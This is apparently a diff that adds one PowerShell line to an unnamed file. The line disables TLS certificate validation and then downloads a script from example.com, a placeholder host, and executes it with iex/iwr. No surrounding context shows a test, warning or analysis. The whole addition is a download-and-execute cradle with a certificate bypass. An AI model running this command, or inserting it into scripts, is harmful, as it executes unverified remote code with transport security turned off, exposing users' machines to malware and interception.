@@ -1,0 +1,1 @@
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex (iwr 'https://example.com/script.ps1' -UseBasicParsing)
